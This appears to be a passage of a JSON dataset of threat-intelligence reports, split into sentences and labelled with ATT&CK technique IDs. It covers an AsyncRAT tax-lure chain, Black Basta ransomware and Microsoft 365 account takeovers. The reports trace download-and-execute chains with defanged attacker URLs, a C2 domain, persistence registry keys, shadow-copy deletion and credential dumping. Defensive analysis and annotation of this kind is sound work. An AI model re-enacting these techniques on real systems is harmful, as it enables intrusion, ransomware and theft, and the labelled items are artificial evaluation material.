            "Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1).",
            "The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code.",
            "It eventually runs: powershell.exe -ExecutionPolicy",
            "UnRestricted [powershell code This PowerShell code is designed to execute whatever was downloaded.",
            "In this case, it downloads \u201cTaxReturn2022.pdf\u201d from hxxp://179.43.175[.]187/pqpf/, saves it as %USERAPPDATA%\\TaxReturn2022.pdf, and opens it.",
            "Unfortunately, this PDF file is a clean decoy file that also requires an unidentified password to open. ",
            "The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file: ",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iXqrVo =",
            "[location of downloaded PDF file] ",
            "This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs. ",
            "The script then sleeps five seconds before downloading and executing whatever has been downloaded.",
            "In this case, it downloads TCywxTOvZk.wsf from hxxp://[redacted].67[.]12:222/ and saves it as %USERAPPDATA%\\TCywxTOvZk.wsf (SHA2: 351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d).",
            "Note that part of the IP address masked as the directory is accessible. ",
            "TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07).",
            "no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: C:\\ProgramData\\Document\\py.ps1 C:\\ProgramData\\schtasks\\Microsoft.bat C:\\ProgramData\\Document\\x.ps1 The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1.",
            "The .ps1 file contains two PE files (stored in $apprun and $appme).",
            "It uses 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker\u2019s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666. ",
            "We also found another .lnk file (SHA2: c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b) hidden in TaxReturns2022.pdf.iso (SHA2: ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2). ",
            "This link file goes through the same infection chain as the previous one: ",
            "The link file downloads and executes hxxp://[redacted].67[.]12:222/xa[.]hta xa[.]hta downloads and executes hxxp://[redacted].67[.]12:222/qDxcmqPPmI[.]wsf qDxcmqPPmI.wsf was not available at the time of the investigation.",
            "However, OSINT led us to find the next action. ",
            "qDxcmqPPmI[.]wsf downloads and executes hxxp://[redacted].67[.]12:222/no[.]txt no[.]txt downloads and executes hxxp://[redacted].67[.]12:222/j[.]png j.png creates py.ps1 and x.ps1.",
            "It also creates and runs Microsoft.bat Microsoft.bat runs py.ps1, which eventually installs Async RAT on the compromised machine Curiously the attacker left the hosting location of the malicious files wide open. ",
            "Figure 10.",
            "Files hosted on the attacker\u2019s open directory ",
            "The directory contains a few files whose names are associated with Adobe Acrobat Reader DC.",
            "This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant. ",
            "readerdc64_en_l_cra_mdr_install_update.exe[.]lnk (SHA2: 653fcea661d8f7d996210dcdbcad110f0dcca8e7bbc906bb0a4d12e3ab674483) readerdc64_en_l_cra_mdr_install_update[.]exe (SHA2: 1b012d01c86be5d68959504d362c52170b27d726cf2943e2e0250506a29c765a) \u2013 this is a legitimate Adobe Acrobat Reader DC installer. ",
            "reader64[.]hta (SHA2: 3b2e776ab44a711a52de88b02c007897eed137b62ecc7fb51bbb3089941bda1a) readerdc64_en_ka_cra_mdr_install_update[.]wsf (SHA2: d2f0995f9184170386360d5eb5990e38a289052e6a15706613c9568a207da7d7) AsyncRAT contains features designed to steal information from compromised machines and a clipper feature that monitors the clipboard for crypto wallet address swapping, which means victims may end up paying more than their taxes. ",
            "But however potential victims end up with the \u201cTaxReturn2022.img\u201d and \u201cTaxReturns2022.pdf.iso\u201d files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain.",
            "A little caution can go a long way toward protecting yourself against tax-related malware. ",
            "Conclusion The attacks covered in this blog are the tip of the iceberg.",
            "Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks.",
            "In the end, those looking to save a dime, in this case, from Uncle Sam, often find that greed endangers them in the cyber world. ",
            "For additional information, please refer to the \u201cTax Scams/Consumer Alerts\u201d alert issued by the IRS for other tips on protecting yourself from tax-related scams. ",
            "Fortinet Protection FortiGuard AntiVirus detects the malicious files identified in this report with the following signatures: JS/Agent.7593!tr JS/Agent.",
            "GDRU!tr LNK/Agent.1eb5!tr.dldr LNK/Agent.3aad!tr.dldr LNK/Agent.412e!tr.dldr LNK/Agent.9982181!tr LNK/Agent.",
            "BF20!tr LNK/Agent.",
            "FF8D!tr PowerShell/Agent.",
            "E67B!tr VBS/Agent.5247!tr.dldr VBS/Agent.9FA6!tr VBS/Agent.",
            "E67C!tr.dldr VBS/Agent.",
            "XAO!tr VBS/Agent.",
            "YNQ!tr VBS/Agent.",
            "YNY!tr.dldr W32/PasswordProtected.829D!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.",
            "Customers running current AntiVirus updates are protected. ",
            "The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. ",
            "Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current. ",
            "If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. ",
            "IOCs File IOCs: Network IOCs "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1105",
                "T1059.003"
            ],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [
                "T1562.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001"
            ],
            [
                "T1562.001",
                "T1055"
            ],
            [],
            [
                "T1204.002"
            ],
            [],
            [
                "T1105"
            ],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [
                "T1113",
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1204.002"
            ],
            [
                "T1204.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1204.002"
            ],
            [
                "T1105",
                "T1204.002"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [
                "T1547.001",
                "T1564.001"
            ],
            [
                "T1547.001"
            ],
            [],
            [
                "T1564.001"
            ],
            [
                "T1105"
            ],
            [],
            [],
            [
                "T1105"
            ],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [
                "T1105"
            ],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1204.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Threat Assessment Black Basta Ransomware",
        "cti_report": [
            "title: Threat Assessment: Black Basta Ransomware url: https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ Executive Summary Black Basta is ransomware as a service (RaaS) that first emerged in April 2022.",
            "However, evidence suggests that it has been in development since February.",
            "The Black Basta operator(s) use the double extortion technique, meaning that in addition to encrypting files on the systems of targeted organizations and demanding ransom to make decryption possible, they also maintain a dark web leak site where they threaten to post sensitive information if an organization chooses not to pay ransom. ",
            "Black Basta affiliates have been very active deploying Black Basta and extorting organizations since the ransomware first emerged.",
            "Although the Black Basta affiliates have only been active for the past couple of months, based on the information posted on their leak site, they have compromised over 75 organizations at the time of this publication.",
            "Unit 42 has also worked on several Black Basta incident response cases. ",
            "The ransomware is written in C++ and impacts both Windows and Linux operating systems.",
            "It encrypts users\u2019 data using a combination of ChaCha20 and RSA-4096, and to speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions.",
            "The faster the ransomware encrypts, the more systems can potentially be compromised before defenses are triggered.",
            "It is a key factor affiliates look for when joining a Ransomware-as-a-Service group. ",
            "Palo Alto Networks customers receive help with detection and prevention of Black Basta ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire). ",
            "If you think you may have been impacted by a cyber incident, the Unit 42 Incident Response team is available 24/7/365.",
            "You can also take preventative steps by requesting any of our cyber risk management services. ",
            "Table of Contents Black Basta Overview Black Basta is ransomware as a service (RaaS) that leverages double extortion as part of its attacks.",
            "The attackers not only execute ransomware but also exfiltrate sensitive data and threaten to release it publicly if the ransom demands are not met.",
            "The threat actors behind the ransomware deploy a name-and-shame approach to their victim, where they use a Tor site, Basta News, to list all of the victims who have not paid the ransom. ",
            "Although the Black Basta RaaS has only been active for a couple of months, according to its leak site, it had compromised over 75 organizations at the time of this publication.",
            "At least 20 victims were posted to its leak site in the first two weeks of the ransomware\u2019s operation, which indicates the group likely is experienced in the ransomware business and has a steady source of initial access. ",
            "It is also possible that this is not a new operation but rather a rebrand of a previous ransomware group that brought along their affiliates.",
            "Based on multiple similarities in tactics, techniques and procedures (TTPs) - victim-shaming blogs, recovery portals, negotiation tactics, and how quickly Black Basta amassed its victims - that the Black Basta group could include current or former members of the Conti group. ",
            "Unit 42 has observed \u200b\u200bthe Black Basta ransomware group using QBot as an initial point of entry and to move laterally in compromised networks.",
            "QBot, also known as Qakbot, is a Windows malware strain that started as a banking trojan and evolved into a malware dropper.",
            "It has been used by other ransomware groups, including MegaCortex, ProLock, DoppelPaymer and Egregor.",
            "While these ransomware groups used QBot for initial access, the Black Basta group was observed using it for both initial access and to spread laterally throughout the network. ",
            "Figure 1 below shows the standard attack lifecycle observed with Black Basta ransomware. ",
            "Figure 1.",
            "Black Basta attack lifecycle based on Unit 42 incident response cases.",
            "Technical Details Black Basta is written in C++ and is cross-platform ransomware that impacts both Windows and Linux systems.",
            "In June 2022, a VMware ESXi variant of Black Basta was observed targeting virtual machines running on enterprise Linux servers. ",
            "The ransomware includes anti-analysis techniques that attempt to detect code emulation or sandboxing to avoid virtual/analysis machine environments.",
            "It also supports the command line argument -forcepath that is used to encrypt files in a specified directory.",
            "Otherwise, the entire system, except for certain critical directories, is encrypted. ",
            "The ransomware spawns a mutex with a string of dsajdhas.0 to ensure a single instance of the malware is running at a time.",
            "Then it will iterate through the entire file system, encrypting files with a file extension of .basta. ",
            "Black Basta ransomware encrypts users\u2019 data through a combination of ChaCha20 and RSA-4096.",
            "To speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions.",
            "The ransomware also attempts to delete shadow copies and other backups of files using vssadmin.exe, a command-line tool that manages Volume Shadow Copy Service (VSS), which captures and copies stable images for backups on running systems. ",
            "It writes the Random-letters.ico and Random-letters.jpg files to the %TEMP% directory.",
            "The .jpg file is leveraged to overwrite the desktop background and appears as follows: Figure 2.",
            "Black Basta desktop wallpaper.",
            "It adds a custom icon to the registry, corresponding to the .basta icon, which is shown in Figure 3. ",
            "Figure 3.",
            "Black Basta icon.",
            "It will then boot the system in safe mode and proceed to encrypt files.",
            "Following successful encryption, the file\u2019s extension is changed to .basta",
            "and the ransomware will write numerous instances of readme.txt, which contains the following ransom note: Figure 4.",
            "Black Basta ransom note.",
            "Tactics, Techniques and Procedures We have observed Black Basta affiliates leveraging the following TTPs: Tactic / Technique Notes TA0001 Initial Access T1566.001.",
            "Phishing:",
            "Spear phishing Attachment Victims receive spear phishing emails with attached malicious zip files - typically password protected.",
            "That contains malicious doc including .doc, .pdf, .xls TA0002 Execution T1569.002.",
            "System Services: Service Execution Black Basta has installed and used PsExec to execute payloads on remote hosts. ",
            "T1047.",
            "Windows Management Instrumentation Utilizes Invoke-TotalExec to push out the ransomware binary. T1059.001.",
            "Command and Scripting Interpreter:",
            "PowerShell Black Basta has encoded PowerShell scripts to download additional scripts. ",
            "TA0003 Persistence T1136.",
            "Create Account Black Basta threat actors created accounts with names such as temp, r, or admin. T1098.",
            "Account Manipulation Added newly created accounts to the administrators' group to maintain elevated access. T1543.003.",
            "Create or Modify System Process:",
            "Windows Service Creates benign-looking services for the ransomware binary. T1574.001.",
            "Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. ",
            "TA0004 Privilege Escalation T1484.001.",
            "Domain Policy Modification:",
            "Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1574.001.",
            "Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1543.003.",
            "Windows Service Creates benign-looking services for the ransomware binary. ",
            "TA0005 Defense Evasion T1484.001.",
            "Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1218.010.",
            "System Binary Proxy Execution: Regsvr32 Black Basta has used regsvr32.exe to execute a malicious DLL. T1070.004.",
            "Indicator Removal on Host: File Deletion Attempts to delete malicious batch files. ",
            "T1112.",
            "Modify Registry Black Basta makes modifications to the Registry. ",
            "T1140.",
            "Deobfuscate/Decode Files or Information Initial malicious .zip file bypasses some antivirus detection due to password protection. ",
            "T1562.001.",
            "Impair Defenses: Disable or Modify Tools Disables Windows Defender with batch scripts, such as d.bat or defof.bat. ",
            "T1562.004.",
            "Impair Defenses: Disable or Modify System Firewall Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP. ",
            "T1562.009.",
            "Impair Defenses: Safe Boot Mode Uses bcdedit to boot the device in safe mode. T1574.001.",
            "Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1622.",
            "Debugger Evasion Uses IsDebuggerPresent to check if processes are being debugged. ",
            "TA0006 Credential Access T1555.",
            "Credentials from Password Stores Black Basta uses Mimikatz to dump passwords. ",
            "TA0007 Discovery T1087.002.",
            "Account Discovery: Domain Account Used commands such as net user /domain and net group /domain. T1016.",
            "System Network Configuration Discovery Lists internal IP addresses to target in C:\\Windows\\pc_list.txt \u2013 typically found on the Domain Controller. T1082.",
            "System Information Discovery Uses GetComputerName to query the computer name. ",
            "T1622.",
            "TA0008 Lateral Movement T1021.001.",
            "Remote Services:",
            "Remote Desktop Protocol Black Basta has used RDP for lateral movement. ",
            "TA0009 Collection T1560.001.",
            "Archive Collected Data: Archive via Utility TA0010 Exfiltration T1567.",
            "Exfiltration over Web Service TA0011 Command and Control T1219.",
            "Remote Access Software Black Basta has installed and used legitimate tools such as TeamViewer and AnyConnect on targeted systems. T1573.",
            "Encrypted Channel Uses Qakbot primarily and Cobalt Strike. ",
            "TA0040 Impact T1486.",
            "Data Encrypted for Impact Black Basta modifies the Desktop background by adding a .jpg in C:\\Temp and creating a registry key HKCU\\Control Panel\\Desktop.",
            "Additionally modifies the registry to change the icon of encrypted files. ",
            "It encrypts files excluding those with a .exe, .cmd, .bat and .com extension.",
            "Uses ChaCha20 or RSA-4096 to encrypt victims. T1489.",
            "Service Stop Uses sc stop and taskkill to stop services. ",
            "T1490.",
            "Inhibit System Recovery Black Basta deletes Volume Shadow Copies using vssadmin. ",
            "Table 1.",
            "Tactics, techniques and procedures for Black Basta activity. ",
            "Victimology ",
            "The ransomware group and its affiliate program reportedly compromised multiple large organizations, in sectors including consumer and industrial products; energy, resources and agriculture; manufacturing; utilities; transportation; government agencies; professional services and consulting; and real estate. ",
            "Black Basta operators also posted on dark web forums expressing interest in attacking organizations based in Australia, Canada, New Zealand, the U.K. and the U.S. Threat actors using the ransomware impacted organizations based in the U.S., Germany, Switzerland, Italy, France and the Netherlands (listed in descending order by numbers of allegedly breached organizations). ",
            "Figure 5.",
            "Black Basta post on dark web forums.",
            "The threat actor(s) responsible for Black Basta operate a cybercrime marketplace and victim name-and-shame blog.",
            "This site is hosted as a Tor hidden service, where the Black Basta ransomware group lists their victims\u2019 names, descriptions, percentage of stolen data which has been published, number of visits and any data exfiltrated.",
            "There were 75 victims listed on the leak site at the time of writing. ",
            "Figure 6.",
            "Black Basta News site where the threat actors post allegedly breached organizations (details redacted) and number of visits.",
            "Courses of Action Several adversarial techniques were observed in activity associated with Black Basta, and the following measures are suggested within Palo Alto Networks products and services to mitigate threats related to Black Basta ransomware, as well as other malware using similar techniques: Product / Service Course of Action Initial Access ",
            "The below courses of action mitigate the following techniques: Spear Phishing Attachment [T1566.001] THREAT PREVENTION Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure a secure antivirus profile is applied to all relevant security policies NEXT-GENERATION FIREWALLS Set up File Blocking CORTEX XDR PREVENT Configure Malware Security Profile CORTEX XSOAR Deploy XSOAR Playbook \u2013 Endpoint Malware Investigation Deploy XSOAR Playbook \u2013 Phishing Investigation \u2013",
            "Generic V2 Execution The below courses of action mitigate the following techniques: Service Execution",
            "[T1569.002], Windows Management Instrumentation",
            "[T1047], PowerShell [T1059.001] NEXT-GENERATION FIREWALLS Ensure remote access capabilities for the User-ID service account are forbidden. ",
            "Ensure that User-ID is only enabled for internal trusted interfaces Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone CORTEX XDR PREVENT Configure Restrictions Security Profile Persistence, Privilege Escalation, Defense Evasion ",
            "The below courses of action mitigate the following techniques: Create Account",
            "[T1136], Account Manipulation [T1098], Regsvr32",
            "[T1218.010], File Deletion",
            "[T1070.004], Disable or Modify Tools [T1562.001], Modify Registry",
            "[T1112], Deobfuscate/Decode Files or Information",
            "[T1140], Disable or Modify System Firewall",
            "[T1562.004], Windows Service [T1543.003], DLL Search Order Hijacking [T1574.001], Group Policy Modification",
            "[T1484.001] NEXT-GENERATION FIREWALLS Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure remote access capabilities for the User-ID service account are forbidden. ",
            "Ensure that User-ID is only enabled for internal trusted interfaces CORTEX XSOAR Deploy XSOAR Playbook \u2013 Access Investigation Playbook Deploy XSOAR Playbook \u2013 Block Account Generic Deploy XSOAR Playbook \u2013 Impossible Traveler CORTEX XDR PREVENT Configure Host Firewall Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Malware Protection Credential Access The below courses of action mitigate the following techniques: Credentials from Password Stores [T1555] CORTEX XDR Cortex XDR monitors for behavioral events and files associated with credential access and exfiltration Discovery ",
            "The below courses of action mitigate the following techniques: System Network Configuration Discovery [T1016],",
            "System Information Discovery [T1082], Domain Account",
            "[T1087.002] CORTEX XDR Cortex XDR monitors for behavioral events along a causality chain to identify discovery behaviors Lateral Movement ",
            "The below courses of action mitigate the following techniques: Remote Desktop Protocol",
            "[T1021.001] NEXT-GENERATION FIREWALLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure remote access capabilities for the User-ID service account are forbidden Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that User-ID is only enabled for internal trusted interfaces Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone ",
            "Ensure that the User-ID service account does not have interactive logon rights Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned and set to appropriate actions Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists CORTEX XDR PREVENT Configure Host Firewall Profile CORTEX XSOAR Deploy XSOAR Playbook \u2013 Access Investigation Playbook Deploy XSOAR Playbook \u2013 Block Account Generic Collection ",
            "The below courses of action mitigate the following techniques: Archive via Utility [T1560.001] CORTEX XDR Monitors for behavioral events via BIOCs including the creation of zip archives Command and Control The below courses of action mitigate the following techniques: Remote Access Software [T1219],",
            "Encrypted Channel [T1573] CORTEX XSOAR Deploy XSOAR Playbook \u2013 PAN-OS Query Logs for Indicators Deploy XSOAR Playbook \u2013 Block URL Deploy XSOAR Playbook \u2013 Block IP NEXT-GENERATION FIREWALLS Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the Internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure secure URL filtering is enabled for all security policies allowing traffic to the Internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of \u2018block\u2019 or \u2018override\u2019 on the URL categories Ensure that access to every URL is logged Impact The below courses of action mitigate the following techniques: Data Encrypted for Impact [T1486], Service Stop [T1489],",
            "Inhibit System Recovery [T1490] CORTEX XSOAR Deploy XSOAR Playbook \u2013 Ransomware Manual for incident response. ",
            "Deploy XSOAR Playbook \u2013 Palo Alto Networks Endpoint Malware Investigation Conclusion Black Basta ransomware operators have been active since at least April 2022.",
            "Although their RaaS has only been active for the past couple of months it had compromised at least 75 organizations at the time of this publication.",
            "Due to the high-profile nature and steady stream of Black Basta attacks identified globally in 2022, the operators and/or affiliates behind the service likely will continue to attack and extort organizations. ",
            "Palo Alto Networks helps detect and prevent Black Basta ransomware in the following ways: WildFire:",
            "All known samples are identified as malware. ",
            "Cortex XDR: Identifies indicators associated with Black Basta. ",
            "Anti-Ransomware Module blocks Black Basta encryption behaviors on Windows. ",
            "Local Analysis detection for Black Basta binaries on Windows and Linux. ",
            "Behavioral Threat Prevention prevents Black Basta behaviors. ",
            "Next-Generation Firewalls:",
            "DNS Signatures detect the known C2 domains, which are also categorized as malware in Advanced URL Filtering. ",
            "If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200. Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.",
            "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
            "Learn more about the Cyber Threat Alliance. ",
            "Additional Resources Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [
                "T1083"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1112"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [
                "T1569.002"
            ],
            [],
            [],
            [],
            [
                "T1027",
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [
                "T1543.003"
            ],
            [],
            [],
            [],
            [
                "T1484.001"
            ],
            [],
            [
                "T1543.003"
            ],
            [],
            [
                "T1484.001"
            ],
            [],
            [
                "T1070.004"
            ],
            [],
            [
                "T1112"
            ],
            [],
            [],
            [],
            [
                "T1562.001",
                "T1059.003"
            ],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [],
            [
                "T1016"
            ],
            [
                "T1082"
            ],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [
                "T1219"
            ],
            [],
            [],
            [
                "T1112"
            ],
            [
                "T1112"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Hafniuminspired cyberattacks neutralized by AI",
        "cti_report": [
            "title: Hafnium-inspired cyber-attacks neutralized by AI url: https://darktrace.com/blog/hafnium-inspired-cyber-attacks-neutralized-by-ai Amidst the ever-changing threat landscape, new tactics, techniques, and procedures (TTPs) seem to emerge daily, creating extreme challenges for security teams.",
            "The broad range of attack methods utilized by attackers seems to present an insurmountable problem: how do you defend against a playbook that does not yet exist?Faced with the growing number of novel and uncommon attack methods, it is essential for organizations to adopt a security solution able to detect threats based on their anomalies, rather than relying on threat intelligence alone. ",
            "In March 2023, Darktrace observed an emerging trend in the use of an application known as \u2018PerfectData Software\u2019 for probable malicious purposes in several Microsoft 365 account takeovers.",
            "Using its anomaly-based detection, Darktrace DETECT:trade_mark: was able to identify the activity chain surrounding the use of this application, potentially uncovering a novel piece of threat actor tradecraft in the process.",
            "Microsoft 365 IntrusionsIn recent years, Microsoft\u2019s Software-as-a-Service (SaaS) suite, Microsoft 365, along with its built-in identity and access management (IAM) service, Azure Active Directory (Azure AD), have been heavily targeted by threat actors due to their near-ubiquitous usage across industries.",
            "Four out of every five Fortune 500 companies, for example, use Microsoft 365 services [1]. ",
            "Malicious actors typically gain entry to organizations\u2019 Microsoft 365 environments by abusing either stolen account credentials or stolen session cookies",
            "[2].",
            "Once inside, actors can access sensitive data within mailboxes or SharePoint repositories, and send out emails or Teams messages.",
            "This activity can often result in serious financial harm, especially in cases where the malicious actor\u2019s end-goal is to elicit fraudulent transactions. ",
            "Darktrace regularly observes malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.",
            "One typical example is the creation of new inbox rules and sending deceitful emails intended to convince recipients to carry out subsequent actions, such as following a malicious link or providing sensitive information.",
            "It is also common for actors to register new applications in Azure AD so that they can be used to conduct follow-up activities, like mass-mailing or data theft.",
            "The registration of applications in Azure AD therefore seems to be a relatively predictable threat actor behavior [3][4].",
            "Darktrace DETECT understands that unusual application registrations in Azure AD may constitute a deviation in expected behavior, and therefore a possible indicator of account compromise.",
            "These registrations of applications in Azure AD are evidenced by creations of, as well as assignments of permissions to, Service Principals in Azure AD.",
            "Darktrace has detected a growing trend in actors creating and assigning permissions to a Service Principal named \u2018PerfectData Software\u2019.",
            "Further investigation of this Azure AD activity revealed it to be part of an ongoing account takeover. ",
            "\u2018PerfectData Software\u2019 Activity Darktrace observed variations of the following pattern of activity relating to an application named \u2018PerfectData Software\u2019 within its customer base:Actor signs in to a Microsoft 365 account from an endpoint associated with a Virtual Private Server (VPS) or Virtual Private Network (VPN) serviceActor registers an application called 'PerfectData Software' with Azure AD, and then grants permissions to the applicationActor accesses mailbox data and creates inbox rule In two separate incidents, malicious actors were observed conducting their activities from endpoints associated with VPN services (HideMyAss (HMA) VPN and Surfshark VPN, respectively) and from endpoints within the Autonomous System AS396073 MAJESTIC-HOSTING-01. ",
            "In March 2023, Darktrace observed a malicious actor signing in to a Microsoft 365 account from a Kuwait-based IP address within the Autonomous System, AS198605 AVAST Software s.r.o.",
            "This IP address is associated with the VPN service, HMA VPN.",
            "Over the next couple of days, an actor (likely the same malicious actor) signed in to the account several more times from two different Nigeria-based endpoints, as well as a VPS-related endpoint and a HMA VPN endpoint. ",
            "During their login sessions, the actor performed a variety of actions.",
            "First, they created and assigned permissions to a Service Principal named \u2018PerfectData Software\u2019.",
            "This Service Principal creation represents the registration of an application called \u2018PerfectData Software\u2019 in Azure AD. ",
            "Although the reason for registering this application is unclear, within a few days the actor registered and granted permission to another application, \u2018Newsletter Software Supermailer\u2019, and created a new inbox rule names \u2018s\u2019 on the mailbox of the hijacked account.",
            "This inbox rule moved emails meeting certain conditions to a folder named \u2018RSS Subscription.",
            "The \u2018Newsletter Software Supermailer\u2019 application was likely registered by the actor to facilitate mass-mailing activity.",
            "Immediately after these actions, Darktrace detected the actor sending out thousands of malicious emails from the account.",
            "The emails included an attachment named \u2018Credit Transfer Copy.html\u2019, which contained a suspicious link.",
